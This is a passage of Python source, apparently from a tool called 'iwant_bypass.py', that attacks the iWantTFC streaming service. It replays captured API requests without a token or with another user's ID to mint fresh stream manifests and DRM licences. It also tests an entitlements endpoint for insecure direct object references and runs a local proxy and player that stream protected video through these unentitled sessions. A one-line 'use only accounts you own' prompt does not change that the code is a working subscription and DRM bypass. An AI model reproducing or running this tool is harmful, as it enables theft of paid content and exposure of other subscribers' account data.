    sets = []
    if field in ("uid", "both"):
        sets.append(UID_K)
    if field in ("orderid", "both"):
        sets.append(OID_K)
    for step in _replay_order(s):
        h = dict(step.get("headers") or {})
        h.update(BH)
        if tok:
            h["authorization"] = f"Bearer {tok}"
        else:
            h.pop("authorization", None)
        body = step.get("body")
        for ks in sets:
            body, _ = _sub(body, ks, foreign)
            body, _ = _add(body, ks, foreign)
        try:
            r = http.request(step["method"], step["url"], headers=h, data=body, timeout=30)
        except http.RequestException:
            continue
        if r.status_code != 200:
            continue
        step["response_body"] = r.text[:200000]
        _scan_blob(s, r.text)
        if s.mpd_url and s.license_url:
            return _mint_finish(s)
    return bool(s.mpd_url and s.license_url)


def probe(s, token):
    out = {"asset_id": s.asset_id, "mode": "same-token", "steps": [], "remint": None,
           "verdict": "INCONCLUSIVE", "reason": ""}
    if not s.api_chain:
        out["reason"] = "no API chain"
        return out
    for step in s.api_chain:
        r = _replay(step, token)
        c = classify(r)
        out["steps"].append({"method": step["method"], "url": step["url"][:160],
                             "status": r["status"], "class": c, "preview": r["text"][:600]})
        log(f"  [{r['status']}] {c}  {_path(step['url'])}")
    scratch = Session(**asdict(s))
    ok = remint(scratch, token)
    out["remint"] = {"ok": ok, "mpd": bool(scratch.mpd_url), "license": bool(scratch.license_url),
                     "cdata": bool(scratch.license_custom_data), "ttl": scratch.mpd_left()}
    log(f"  remint: {'minted' if ok else 'refused'}", "g" if ok else "w")
    if ok:
        out["verdict"] = "BYPASS"
        out["reason"] = "fresh mint succeeded with supplied token - entitlement not enforced server-side"
        return out
    cl = [x["class"] for x in out["steps"]]
    if cl and all(c in ("GATED", "EDGE") for c in cl):
        out["verdict"] = "GATED"
        out["reason"] = "every step rejected and remint refused"
    elif cl and cl[-1] in ("GATED", "EDGE"):
        out["verdict"] = "GATED"
        out["reason"] = "mint rejected"
    else:
        out["reason"] = "remint refused but replay mostly OK - likely expired URLs; recapture"
    return out


def chain(s, token, foreign, field):
    out = {"asset_id": s.asset_id, "mode": f"foreign-{field}", "value": foreign,
           "steps": [], "remint": None, "verdict": "INCONCLUSIVE", "reason": ""}
    if not s.api_chain:
        out["reason"] = "no API chain"
        return out
    sets = []
    if field in ("uid", "both"):
        sets.append(("userId", UID_K))
    if field in ("orderid", "both"):
        sets.append(("orderId", OID_K))
    for step in s.api_chain:
        body = step.get("body")
        touched = []
        for _l, ks in sets:
            body, t1 = _sub(body, ks, foreign)
            body, t2 = _add(body, ks, foreign)
            touched.extend(t1 + t2)
        r = _replay(step, token, body)
        c = classify(r)
        out["steps"].append({"method": step["method"], "url": step["url"][:160],
                             "status": r["status"], "class": c,
                             "injected": touched, "preview": r["text"][:600]})
        log(f"  [{r['status']}] {c}  inj={touched or '-'}")
    scratch = Session(**asdict(s))
    ok = remint_sub(scratch, token, foreign, field)
    out["remint"] = {"ok": ok, "mpd": bool(scratch.mpd_url), "license": bool(scratch.license_url)}
    any_inj = any(x["injected"] for x in out["steps"])
    if ok and any_inj:
        out["verdict"] = "BYPASS"
        out["reason"] = f"minted with {field}={foreign} applied - body trusted over token"
    elif ok:
        out["verdict"] = "BYPASS-NO-SUB"
        out["reason"] = "minted with NO substitution applied - same anonymous bypass as probe"
    elif all(x["class"] in ("GATED", "EDGE") for x in out["steps"]):
        out["verdict"] = "GATED"
        out["reason"] = f"foreign {field} rejected everywhere"
    else:
        out["reason"] = "mixed - inspect previews; remint refused"
    return out


# ---------------------------------------------------------------- IDOR
def _isub(o):
    return isinstance(o, dict) and sum(1 for k in SUB_H if k in o) >= 2


def _plan(x):
    try:
        p = float(x.get("retailPrice") or 0)
    except (TypeError, ValueError):
        p = 0.0
    return (bool(x.get("isFreemium")), _n(x.get("subscriptionType")),
            _n(x.get("description")), p, _n(x.get("serviceId")))


def analyze(res, expected_uid, baseline=None):
    a = {"status": res["status"], "data_state": "unknown", "subscription_count": 0,
         "returned_uids": [], "orderids": [], "new_orderids": [], "plan_sigs": [],
         "records_carry_uid": True, "is_leak": False, "is_inconclusive": False, "note": ""}
    if res["status"] == "ERR" or res["status"] in (500, 502, 503, 504):
        a["is_inconclusive"] = True
        a["note"] = f"err {res['status']}"
        return a
    if res["status"] in (401, 403):
        a["data_state"] = "rejected"
        a["note"] = f"HTTP {res['status']}"
        return a
    if res["status"] != 200:
        a["is_inconclusive"] = True
        a["note"] = f"HTTP {res['status']}"
        return a
    j = res["json"]
    if not isinstance(j, dict):
        a["is_inconclusive"] = True
        a["note"] = "not object"
        return a
    sc = _n(j.get("statusCode"))
    if sc not in ("", "1", "200"):
        inner = j.get("data")
        if isinstance(inner, dict) and _n(inner.get("statusCode")) in ("1", "200"):
            sc = _n(inner.get("statusCode"))
    if sc not in ("", "1", "200"):
        a["is_inconclusive"] = True
        a["note"] = f"body status {sc}"
        return a
    subs = [o for o in _walk(j.get("data")) if _isub(o)]
    if not subs:
        a["data_state"] = "empty"
        a["note"] = "no subs"
        return a
    a["data_state"] = "populated"
    a["subscription_count"] = len(subs)
    ret = sorted({_n(x.get("userId")) for x in subs if x.get("userId")})
    a["returned_uids"] = ret
    a["records_carry_uid"] = bool(ret)
    if expected_uid and ret and expected_uid not in ret:
        a["is_leak"] = True
        a["note"] = f"asked {expected_uid[:8]}..., got {[u[:8] + '...' for u in ret]}"
        return a
    oids = sorted({_n(x.get("orderId")) for x in subs if x.get("orderId")})
    a["orderids"] = oids
    a["plan_sigs"] = [_plan(x) for x in subs]
    if baseline is None:
        a["note"] = f"{len(subs)} sub(s), oids={oids}" + ("" if ret else " (no uid field)")
        return a
    nids = [o for o in oids if o and o not in baseline["orderids"]]
    if nids:
        a["new_orderids"] = nids
        a["is_leak"] = True
        a["note"] = f"new oids {nids}"
        return a
    nsig = [x for x in a["plan_sigs"] if x not in baseline["plan_sigs"]]
    if nsig:
        a["is_leak"] = True
        a["note"] = f"plan changed {nsig}"
        return a
    a["note"] = f"{len(subs)} sub(s) match base" + (
        f" (uids={[u[:8] + '...' for u in ret]})" if ret else " (no uid field)")
    return a


def _idor_call(tok, body):
    h = dict(BH)
    if tok:
        h["authorization"] = f"Bearer {tok}"
    try:
        r = http.post(SUBS, headers=h, json=body, timeout=25)
    except http.RequestException as e:
        return {"status": "ERR", "json": None, "text": f"net {e}"}
    p = None
    try:
        p = r.json()
    except ValueError:
        pass
    return {"status": r.status_code, "json": p, "text": r.text[:1500]}


def _idor_retry(tok, body, tries=3, delay=5):
    last = None
    for i in range(tries):
        last = _idor_call(tok, body)
        if last["status"] not in (500, 502, 503, 504) and last["status"] != "ERR":
            return last
        if i < tries - 1:
            w = delay * (2 ** i)
            log(f"retry {i + 1}/{tries - 1} in {w}s...", "w")
            time.sleep(w)
    return last


def _ib(uid, aa=False, tv=False):
    return {"userId": uid, "includeTvod": tv, "includeAllActive": aa}


def run_idor(ta, ua, tb="", ub=""):
    T = []

    def add(lbl, cat, tok, body, euid, base=None):
        log(f"\n-> {lbl}")
        r = _idor_retry(tok, body)
        a = analyze(r, euid, base)
        T.append({"label": lbl, "category": cat,
                  "request": {"auth": bool(tok), "userId": _n(body["userId"])[:8] + "...",
                              "allActive": body["includeAllActive"], "tvod": body["includeTvod"]},
                  "response": {"status": r["status"], "body_preview": r["text"][:500]},
                  "analysis": a})
        log(f"  [{r['status']}] {a['note']}")
        time.sleep(3)
        return T[-1]

    log("=" * 72)
    log("IDOR - get-active-entitlements")
    log("=" * 72)
    b = add("A -> A (baseline)", "baseline", ta, _ib(ua), ua)
    if b["analysis"]["is_inconclusive"]:
        log("baseline inconclusive - abort", "e")
        return T, False
    if b["response"]["status"] != 200 or b["analysis"]["data_state"] == "empty":
        log(f"baseline unusable ({b['response']['status']}, {b['analysis']['data_state']}) - abort", "e")
        return T, False
    bs = b["analysis"]
    if not bs["records_carry_uid"]:
        log("note: records have no userId field - detection is orderId/plan diffing only", "w")
    log(f"\nbaseline oids={bs['orderids']} plans={bs['plan_sigs']}")
    na = add("no token -> A", "auth-bypass", None, _ib(ua), ua, bs)
    if tb and ub:
        add("A token -> B", "idor", ta, _ib(ub), ub, bs)
    else:
        log("A->B skipped (set IWANT_TOKEN_B+IWANT_UID_B)", "w")
    add("A + includeAllActive", "escalation", ta, _ib(ua, aa=True), ua, bs)
    add("A + includeTvod", "escalation", ta, _ib(ua, tv=True), ua, bs)
    add("A -> empty uid", "idor", ta, _ib(""), "", bs)
    log("\n" + "=" * 72)
    log("VERDICT")
    log("=" * 72)
    crit, ins = [], []
    if na["analysis"]["data_state"] == "populated":
        crit.append(f"NO auth returned {na['analysis']['subscription_count']} sub(s) "
                    f"for {ua[:8]}... (oids={na['analysis']['orderids']})")
    for t in T:
        if t["category"] == "idor" and t["analysis"]["is_leak"]:
            crit.append(f"{t['label']}: {t['analysis']['note']}")
        if t["category"] == "escalation" and t["analysis"]["is_leak"]:
            ins.append(f"{t['label']}: {t['analysis']['note']}")
    if crit:
        log("[BYPASS] auth bypass:", "g")
        for c in crit:
            log(f"   * {c}", "g")
    elif ins:
        log("[MAYBE] possible escalation:", "w")
        for i in ins:
            log(f"   * {i}", "w")
    else:
        log("[CLEAN] no bypass", "w")
        log(f"baseline oids={bs['orderids']}")
    return T, True


def prompt_idor():
    log("=" * 72)
    log("IDOR - use ONLY accounts you own")
    log("=" * 72)
    ta = os.environ.get("IWANT_TOKEN_A", "").strip()
    ua = os.environ.get("IWANT_UID_A", "").strip()
    if not ta:
        ta = getpass.getpass("A bearer (blank = unauth probe): ").strip()
    if not ua:
        ua = input("A userId: ").strip()
    if not ua:
        log("userId required", "e")
        return None
    tb = os.environ.get("IWANT_TOKEN_B", "").strip()
    ub = os.environ.get("IWANT_UID_B", "").strip()
    if not (tb and ub):
        log("(B optional, Enter skip)")
        try:
            tb = getpass.getpass("B bearer (Enter skip): ").strip()
            if tb:
                ub = input("B userId: ").strip()
        except (EOFError, KeyboardInterrupt):
            tb = ub = ""
    return ta, ua, tb, ub


# ---------------------------------------------------------------- EZDRM probe
def ezdrm_probe(s):
    out = {"license_url": norm_lic(s.license_url), "custom_data_present": bool(s.license_custom_data),
           "status": None, "error": "", "note": ""}
    if not s.license_url:
        out["note"] = "no license URL in session"
        return out
    dummy = base64.b64encode(b"anonymous-probe-challenge").decode()
    body = dummy.encode()
    if s.license_mode == "json":
        body = json.dumps({"challenge": dummy, "CustomData": s.license_custom_data or ""}).encode()
    h = clean(s.license_headers, ("host", "content-length", "authorization", "cookie"))
    if s.license_custom_data:
        for hname in CHDR:
            h[hname] = s.license_custom_data
    h["origin"] = S
    h["referer"] = S + "/"
    try:
        r = http.request(s.license_method, norm_lic(s.license_url), headers=h, data=body, timeout=30)
        out["status"] = r.status_code
        if r.status_code == 400:
            out["note"] = "400 on placeholder challenge - endpoint live; malformed input rejected (expected)"
        elif r.status_code in (401, 403):
            out["note"] = "auth-gated at EZDRM (CustomData likely expired)"
        elif r.status_code == 200:
            out["note"] = "200 - EZDRM accepted an unauthenticated request with captured CustomData"
        elif r.status_code == 500 and b"Runtime Error" in r.content:
            out["note"] = "500 Runtime Error on placeholder challenge - endpoint reached, real CDM challenge needed"
        else:
            out["note"] = f"unexpected status {r.status_code}"
    except http.RequestException as e:
        out["error"] = str(e)
    return out


# ---------------------------------------------------------------- local player
ST = {"s": None, "last_remint": 0.0, "keys": [], "pages": [], "inject": False,
      "cdp": False, "browser": None, "mpd_cache": (0.0, "", "")}


def ensure_fresh(s, force=False):
    if not s.api_chain:
        return False
    if not force:
        mpd_ok = s.mpd_left() > 30 or s.mpd_left() < 0
        if s.mpd_url and s.license_url and s.lic_left() > 30 and mpd_ok:
            return True
        if s.is_live and s.mpd_url and time.time() - ST["last_remint"] < 20:
            return True
    ok = remint(s, "")
    ST["last_remint"] = time.time()
    ST["mpd_cache"] = (0.0, "", "")
    log(f"remint {'ok' if ok else 'refused'}", "g" if ok else "w")
    if ok:
        tpl = json.dumps(inject_cfg()["template"])
        for pg in ST.get("pages", []):
            try:
                pg.evaluate(f"window.__iwant && (window.__iwant.cfg.template = {tpl})")
            except Exception:
                pass
    return ok


def _xesc(u):
    return (u.replace("&amp;", "&").replace("&lt;", "<").replace("&gt;", ">")
             .replace("&quot;", '"').replace("&apos;", "'")).strip()


def mpd_base(xml_text, mpd_url):
    """DASH relative URLs resolve against <BaseURL>, not the manifest URL."""
    m = XML_BASE.search(xml_text)
    return urljoin(mpd_url, _xesc(m.group(1))) if m else mpd_url


def rewrite_mpd(xml_text, base):
    def wrap(u):
        return "/p/abs?u=" + quote(urljoin(base, _xesc(u)), safe="$")

    out = XML_ATTR.sub(lambda m: f'{m.group(1)}="{wrap(m.group(2))}"', xml_text)
    out = XML_BASE.sub("", out)
    out = XML_LOC.sub("", out)
    if "minimumUpdatePeriod=" not in out:
        out = re.sub(r"<MPD(\s|>)", r'<MPD minimumUpdatePeriod="PT2S"\1', out, count=1)
    return out


def license_post(s, raw):
    if not s.license_url:
        return None, "no license url"
    if s.lic_exp and s.lic_exp - time.time() <= 5:
        log(f"[LIC] CustomData expired {int(time.time() - s.lic_exp)}s ago - reminting", "w")
        ensure_fresh(s, force=True)
    for attempt in (1, 2):
        url = norm_lic(s.license_url)
        h = clean(s.license_headers, DROP_REQ)
        if s.uauth and s.license_auth == "query":
            url += ("&" if "?" in url else "?") + f"{UA_H}={quote(s.uauth)}"
        elif s.uauth and s.license_auth == "cookie":
            h["cookie"] = f"{UA_H}={s.uauth}"
        if s.license_mode == "json":
            payload = json.dumps({"challenge": base64.b64encode(raw).decode(),
                                  "CustomData": s.license_custom_data or ""}).encode()
            ct = "application/json"
        else:
            payload, ct = raw, s.license_content_type or "application/octet-stream"
        h["content-type"] = ct
        h["origin"] = S
        h["referer"] = S + "/"
        try:
            r = http.request(s.license_method or "POST", url, headers=h,
                             data=payload, timeout=30)
        except http.RequestException as e:
            log(f"[LIC] net error: {e}", "e")
            return None, str(e)
        log(f"[LIC] {r.status_code} {s.license_url[:70]} ({len(r.content)}b)",
            "g" if r.status_code == 200 else "e")
        if r.status_code in (400, 401, 403) and attempt == 1:
            if r.content:
                log(f"[LIC] {r.status_code} body: {r.content[:200]!r}", "w")
            if ensure_fresh(s, force=True):
                continue
        if r.status_code != 200 and r.content:
            log(f"[LIC] {r.status_code} body: {r.content[:200]!r}", "e")
        ST["keys"].append({"at": datetime.now().isoformat(timespec="seconds"),
                           "status": r.status_code, "bytes": len(r.content),
                           "license_url": s.license_url,
                           "cdata": bool(s.license_custom_data)})
        return r, ""
    return None, "retries exhausted"


PLAYER_HTML = """<!doctype html><meta charset="utf-8"><title>iWantTFC local</title>
<style>
 body{margin:0;background:#0b0d10;color:#d8dee9;font:13px/1.5 ui-monospace,monospace}
 #bar{padding:10px 14px;background:#14181d;border-bottom:1px solid #232a32}
 #bar b{color:#7fd1a8} #bar span{margin-right:16px}
 #bar button{background:#2d333b;color:#d8dee9;border:0;border-radius:4px;padding:4px 10px;
  cursor:pointer;margin-right:8px}
 #warn{padding:10px 14px;background:#3a1d1d;color:#e06c75;display:none}
 video{width:100%;max-height:78vh;background:#000;display:block}
 #log{padding:10px 14px;white-space:pre-wrap;color:#8b96a5;max-height:16vh;overflow:auto}
 .e{color:#e06c75} .g{color:#7fd1a8} .w{color:#e5c07b}
</style>
<div id="bar"><b>local player</b>
 <span>mode: __MODE__</span><span>asset: __ASSET__</span>
 <span id="st">starting...</span>
 <button class="alt" onclick="self_()">selftest</button>
 <span><a href="/" style="color:#61afef">console</a></span></div>
<div id="warn"></div>
<video id="v" controls autoplay playsinline muted></video>
<div id="log"></div>
<script src="https://cdn.dashjs.org/latest/dash.all.min.js"></script>
<script>
const L=(m,c)=>{const d=document.getElementById('log');const p=document.createElement('div');
 if(c)p.className=c;p.textContent=new Date().toLocaleTimeString()+'  '+m;
 d.appendChild(p);d.scrollTop=1e9;};
const st=m=>{document.getElementById('st').textContent=m;};
const warn=t=>{const w=document.getElementById('warn');w.style.display='block';w.textContent=t;};
L('license proxy: __LIC__');
const player=dashjs.MediaPlayer().create();
player.on('manifestLoaded',()=>L('manifest loaded','g'));
player.on('streamInitialized',()=>L('stream initialized','g'));
player.on('licenseMessage',()=>L('license request sent','w'));
player.setProtectionData({'com.widevine.alpha':{serverURL:'__LIC__',httpRequestHeaders:{}}});
player.updateSettings({streaming:{delay:{liveDelay:4,liveCatchupTime:3.5},
  retryAttempts:{MPD:10,Media:10,XHR:10}}});
player.on('playbackStarted',()=>{st('playing');L('playback started','g');
  document.getElementById('v').muted=false;});
player.on('canPlay',()=>st('buffered'));
player.on('error',e=>{st('error');const m=(e.error&&e.error.message)||JSON.stringify(e);
  L(m,'e');
  if(/no chain|remint refused/i.test(m))warn('No chain - run: capture <url> --inject --trace, or mint <id> --from-capture --http');
  if(e.error&&(e.error.code===10||e.error.code===11))setTimeout(restart,2500);});
player.on('protectionError',e=>L('DRM: '+((e.error&&e.error.message)||'unknown'),'e'));
let tries=0;
function restart(){if(tries++>8)return L('giving up','e');
 L('refreshing manifest ('+tries+')');
 player.attachSource('/p/manifest.mpd?r='+Date.now());}
const vid=document.getElementById('v');
vid.removeAttribute('poster');
document.addEventListener('click',()=>{vid.muted=false;vid.play&&vid.play().catch(()=>{});});
let watchT=-1,watchAt=Date.now(),stalls=0;
setInterval(()=>{const t=vid.currentTime;
 if(!vid.paused&&t!==watchT){watchT=t;watchAt=Date.now();}
 if(!vid.paused&&Date.now()-watchAt>12000&&stalls<3){
  stalls++;watchAt=Date.now();
  L('stalled at '+t.toFixed(1)+'s - reattaching ('+stalls+'/3)','w');
  restart();
 }
},2000);
async function self_(){const r=await fetch('/api/selftest',{method:'POST'});const j=await r.json();
 L('selftest '+JSON.stringify(j),'w');}
player.initialize(vid,'/p/manifest.mpd',true);
async function tick(){try{const r=await fetch('/api/session');const j=await r.json();
 if(j.ok)st(j.is_live?'live':'vod');
 if(j.ok&&j.steps===0)warn('No chain - capture or mint first. Press selftest for detail.');
}catch(e){}}
tick();setInterval(tick,4000);
</script>
"""

CONSOLE_HTML = """<!doctype html><meta charset="utf-8"><title>iWantTFC console</title>
<style>
 body{margin:0;background:#0b0d10;color:#d8dee9;font:12px/1.55 ui-monospace,monospace}
 h2{font-size:13px;margin:18px 14px 6px;color:#61afef;text-transform:uppercase;letter-spacing:.08em}
 .w{padding:0 14px 14px} #hdr{padding:12px 14px;background:#14181d;border-bottom:1px solid #232a32}
 #hdr b{color:#7fd1a8} #warn{padding:10px 14px;background:#3a1d1d;color:#e06c75;display:none}
 button{background:#1f6feb;color:#fff;border:0;border-radius:4px;padding:7px 14px;cursor:pointer;margin-right:8px}
 button.alt{background:#2d333b} pre{white-space:pre-wrap;color:#9aa5b1;margin:0}
 input{width:100%;background:#0f1317;color:#d8dee9;border:1px solid #232a32;padding:7px;
  border-radius:4px;margin-bottom:8px}
 a{color:#61afef}
</style>
<div id="hdr"><b>iWantTFC console</b>
 &nbsp;<span id="meta">loading...</span>
 &nbsp;<a href="/play" target="_blank">open local player -></a></div>
<div id="warn"></div>
<h2>session</h2><div class="w"><pre id="sess">...</pre></div>
<h2>identity</h2><div class="w"><button class="alt" onclick="idn()">refresh</button>
 <pre id="idn">-</pre></div>
<h2>injection</h2><div class="w">
 <button onclick="inj(true)">arm</button><button class="alt" onclick="inj(false)">disarm</button>
 <button class="alt" onclick="tpl()">reload template</button>
 <pre id="inj">-</pre></div>
<h2>observed traffic</h2><div class="w"><button class="alt" onclick="obs()">refresh</button>
 <pre id="obs">-</pre></div>
<h2>probe - no token</h2>
<div class="w"><button onclick="go('probe')">run probe</button>
 <button class="alt" onclick="go('licprobe')">license matrix</button>
 <pre id="probe"></pre></div>
<h2>chain - substitute identity</h2>
<div class="w"><input id="tok" placeholder="bearer (blank = unauth)">
 <input id="val" placeholder="foreign uid / orderId">
 <button onclick="go('chain')">run chain</button>
 <button class="alt" onclick="go('ezdrm')">ezdrm probe</button>
 <pre id="chain"></pre></div>
<script>
const B='__BASE__';
async function j(u,b){const r=await fetch(B+u,{method:'POST',
 headers:{'content-type':'application/json'},body:JSON.stringify(b||{})});return r.json();}
function put(id,o){document.getElementById(id).textContent=JSON.stringify(o,null,2);}
async function go(kind){put(kind,'running...');let o;
 if(kind==='chain')o=await j('/api/chain',{token:document.getElementById('tok').value,
   value:document.getElementById('val').value,field:'both'});
 else if(kind==='licprobe'){o=await j('/api/licprobe');put('probe',o);return;}
 else o=await j('/api/'+kind);put(kind,o);}
async function inj(on){put('inj',await j('/api/inject',{on:on}));}
async function tpl(){put('inj',await j('/api/refresh-template'));}
async function obs(){const r=await fetch(B+'/api/observed');put('obs',await r.json());}
async function idn(){const r=await fetch(B+'/api/ident');put('idn',await r.json());}
async function tick(){const r=await fetch(B+'/api/session');const j=await r.json();
 if(!j.ok){document.getElementById('meta').textContent='no session';return;}
 document.getElementById('meta').textContent=`asset ${j.asset_id.slice(0,8)}... | `+
  `${j.is_live?'LIVE':'vod'} | lane ${j.lane} | steps ${j.steps} | mpds ${j.mpds} | kid ${j.kid} | inj ${j.inject}`;
 if(j.steps===0){const w=document.getElementById('warn');w.style.display='block';
  w.textContent='No chain. Run: python iwant_bypass.py capture <player-url> --inject --trace --no-ads';}
 document.getElementById('sess').textContent=JSON.stringify(j,null,2);}
tick();setInterval(tick,3000);
</script>
"""


def serve(s, open_browser=False, port=PORT, exe=""):
    s.mpd_url = norm_mpd(s.mpd_url)
    s.license_url = norm_lic(s.license_url)
    ST["s"] = s
    app = Flask(__name__)

    @app.route("/")
    def ix():
        return Response(CONSOLE_HTML.replace("__BASE__", f"http://127.0.0.1:{port}"),
                        mimetype="text/html")

    @app.route("/play")
    def play():
        return Response(PLAYER_HTML.replace("__LIC__", "/p/license")
                        .replace("__MODE__", "LIVE" if s.is_live else "vod")
                        .replace("__ASSET__", s.asset_id[:8] + "..."), mimetype="text/html")

    @app.route("/api/session")
    def ases():
        s = ST["s"]
        if not s:
            return {"ok": False}
        return {"ok": True, "asset_id": s.asset_id, "is_live": s.is_live,
                "mpd_left": s.mpd_left(), "lic_left": s.lic_left(), "lic_exp": s.lic_exp,
                "has_license": bool(s.license_url),
                "license_post_observed": s.license_post_observed,
                "cdata": bool(s.license_custom_data), "note": s.note,
                "blocked": s.blocked, "steps": len(s.api_chain), "keys": len(ST["keys"]),
                "api_hits": len([e for e in s.api_chain if "api.iwanttfc.com" in e["url"]]),
                "observed": len(s.observed),
                "gated": len([o for o in s.observed
                              if o.get("status") not in (0, 200)
                              and not EDGE_RE.search(o.get("resp") or "")]),
                "edge": len([o for o in s.observed if EDGE_RE.search(o.get("resp") or "")]),
                "ent": s.ent[:24], "inject": bool(ST.get("inject")),
                "lane": "eps", "country": COUNTRY, "platform": PLATFORM,
                "kid": bool(s.kid), "mpds": len(s.mpds), "uauth_mode": s.license_auth,
                "identity": bool(s.identity.get("userId"))}

    @app.route("/api/ident")
    def aident():
        s = ST["s"]
        live, err = userdata(s.bearer if s else "")
        return {"injected": (s.identity if s else {}), "live": live, "error": err}

    @app.route("/api/keys")
    def akeys():
        return {"keys": ST["keys"]}

    @app.route("/api/trace")
    def atrace():
        s = ST["s"]
        return {"trace": (s.trace[-600:] if s else [])}

    @app.route("/api/observed")
    def aobs():
        s = ST["s"]
        return {"observed": (s.observed if s else [])}

    @app.route("/api/routes")
    def aroutes():
        return load_routes()

    @app.route("/api/grab")
    def agrab():
        if not GRABF.exists():
            return {"ok": False}
        return json.loads(GRABF.read_text(encoding="utf-8"))

    @app.route("/api/template")
    def atpl():
        return {"ok": TPLF.exists(), "template": load_template()}

    @app.route("/api/inject", methods=["POST"])
    def ainj():
        on = bool((request.json or {}).get("on", True))
        ST["inject"] = on
        hit = 0
        for pg in ST.get("pages", []):
            try:
                pg.evaluate(f"window.__iwant && window.__iwant.{'on' if on else 'off'}()")
                hit += 1
            except Exception:
                pass
        return {"ok": True, "on": on, "pages": hit}

    @app.route("/api/refresh-template", methods=["POST"])
    def aretpl():
        tpl = json.dumps(inject_cfg()["template"])
        hit = 0
        for pg in ST.get("pages", []):
            try:
                pg.evaluate(f"window.__iwant && (window.__iwant.cfg.template = {tpl})")
                hit += 1
            except Exception:
                pass
        return {"ok": True, "pages": hit, "template": load_template()}

    @app.route("/api/probe", methods=["POST"])
    def aprb():
        s = ST["s"]
        return probe(s, (request.json or {}).get("token", "")) if s else {"ok": False}

    @app.route("/api/chain", methods=["POST"])
    def ach():
        s = ST["s"]
        j = request.json or {}
        if not s:
            return {"ok": False}
        return chain(s, j.get("token", ""), j.get("value", j.get("orderid", "")),
                     j.get("field", "both"))

    @app.route("/api/ezdrm", methods=["POST"])
    def aez():
        s = ST["s"]
        return ezdrm_probe(s) if s else {"ok": False}

    @app.route("/api/licprobe", methods=["POST"])
    def alic():
        s = ST["s"]
        return lic_probe(s, resolve_uauth("")) if s else {"ok": False}

    @app.route("/api/selftest", methods=["POST"])
    def aself():
        s = ST["s"]
        if not s:
            return {"ok": False, "reason": "no session"}
        out = {"chain": len(s.api_chain), "has_mpd": bool(s.mpd_url),
               "has_license": bool(s.license_url), "cdata": bool(s.license_custom_data),
               "lic_left": s.lic_left(), "mpd_left": s.mpd_left()}
        if not s.api_chain:
            out["reason"] = "empty chain - capture or mint first"
            return out
        if not ensure_fresh(s):
            out["reason"] = "remint refused"
            return out
        try:
            r = http.get(s.mpd_url, headers=clean(s.mpd_headers, DROP_REQ), timeout=20)
            out["mpd_status"] = r.status_code
            out["mpd_len"] = len(r.content)
        except http.RequestException as e:
            out["mpd_status"] = f"ERR {e}"
        if s.license_url:
            dummy = base64.b64encode(b"selftest-challenge-000000").decode()
            h = clean(s.license_headers, DROP_REQ)
            if s.license_mode == "json":
                payload = json.dumps({"challenge": dummy,
                                      "CustomData": s.license_custom_data or ""}).encode()
                h["content-type"] = "application/json"
            else:
                payload, h["content-type"] = b"selftest", (s.license_content_type
                                                           or "application/octet-stream")
            try:
                r = http.post(norm_lic(s.license_url), headers=h, data=payload, timeout=20)
                out["license_status"] = r.status_code
                out["license_preview"] = r.text[:200] if r.content else ""
                if r.status_code == 200:
                    out["license_note"] = "real licence returned"
                elif r.status_code == 500 and b"Runtime Error" in r.content:
                    out["license_note"] = ("endpoint reached; placeholder challenge rejected "
                                           "(expected - the player sends a real CDM challenge)")
                elif r.status_code in (400, 401, 403):
                    out["license_note"] = "auth/format rejected on placeholder challenge"
                else:
                    out["license_note"] = f"unexpected status {r.status_code}"
            except http.RequestException as e:
                out["license_status"] = f"ERR {e}"
                out["license_note"] = "network failure"
        lic_ok = True
        if not s.license_url:
            lic_ok = False
        elif isinstance(out.get("license_status"), str):
            lic_ok = False
        elif s.lic_exp and s.lic_left() <= 0:
            lic_ok = False
            out["license_note"] = "CustomData expired and remint did not replace it"
        out["ok"] = out.get("mpd_status") == 200 and lic_ok
        return out

    @app.route("/p/manifest.mpd")
    def pmpd():
        s = ST["s"]
        if not s:
            return ("no session", 404)
        if not s.api_chain:
            log("[MPD] 502 no chain", "e")
            return ("no chain - capture with --inject, or mint --from-capture", 502)
        if not ensure_fresh(s) or not s.mpd_url:
            return ("remint refused - chain no longer mints; recapture", 502)
        base = s.mpd_url
        try:
            r = http.get(base, headers=clean(s.mpd_headers, DROP_REQ), timeout=30)
        except http.RequestException as e:
            return (f"manifest fetch failed: {e}", 502)
        if r.status_code != 200:
            return (r.text[:400], r.status_code)
        body = r.text
        return Response(rewrite_mpd(body, mpd_base(body, base)), mimetype="application/dash+xml")

    @app.route("/p/abs")
    def pabs():
        s = ST["s"]
        u = unquote(request.args.get("u", ""))
        if not s or not u:
            return ("bad", 400)
        h = clean(s.mpd_headers, DROP_REQ)
        if request.headers.get("range"):
            h["range"] = request.headers["range"]
        try:
            r = http.get(u, headers=h, stream=True, timeout=30)
        except http.RequestException as e:
            return (f"segment fetch failed: {e}", 502)

        def gen():
            for c in r.iter_content(65536):
                yield c

        resp = Response(gen(), status=r.status_code,
                        mimetype=r.headers.get("content-type", "application/octet-stream"))
        for k in ("content-range", "content-length", "accept-ranges"):
            if r.headers.get(k):
                resp.headers[k] = r.headers[k]
        return resp

    @app.route("/p/license", methods=["GET", "POST", "OPTIONS"])
    def plic():
        s = ST["s"]
        if request.method == "OPTIONS":
            return ("", 204)
        if not s or not s.license_url:
            return ("no license", 404)
        for k, v in request.headers.items():
            if k.lower().startswith("x-") or k.lower() == "authorization":
                s.license_headers[k] = v
        r, err = license_post(s, request.get_data())
        if r is None:
            return (err or "license failed", 502)
        resp = Response(r.content, status=r.status_code)
        resp.headers["content-type"] = r.headers.get("content-type", "application/octet-stream")
        if r.status_code != 200:
            log(f"[LIC-PROXY] {r.status_code} {r.content[:160]!r}", "e")
        return resp

    url = f"http://127.0.0.1:{port}"
    threading.Thread(target=lambda: app.run(host="127.0.0.1", port=port, debug=False,
                                            use_reloader=False, threaded=True), daemon=True).start()
    if open_browser:
        threading.Timer(1.2, lambda: open_url(url + "/play", exe)).start()
    log(f"console {url}   player {url}/play   (Ctrl-C to stop)")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        pass


# ---------------------------------------------------------------- plan / selftest
def newest_complete():
    for c in sorted(SD.glob("*.json"), key=lambda p: p.stat().st_mtime, reverse=True):
        try:
            d = json.loads(c.read_text(encoding="utf-8"))
        except (OSError, ValueError):
            continue
        if d.get("mpd_url") and d.get("license_url"):
            return c
    return None


def do_plan(token="", uid=""):
    """Read-only view of what the account is actually entitled to."""
    tok, exp = resolve_token(token, None, "", allow_harvest=True)
    report_ttl(tok, exp)
    if not tok:
        log("no bearer - run: token", "e")
        return 1
    plan, err = active_plan(tok, uid)
    if err:
        log(f"plan lookup failed: {err}", "e")
        return 1
    log(f"country {plan['country'] or '?'}", "g")
    if not plan["plans"]:
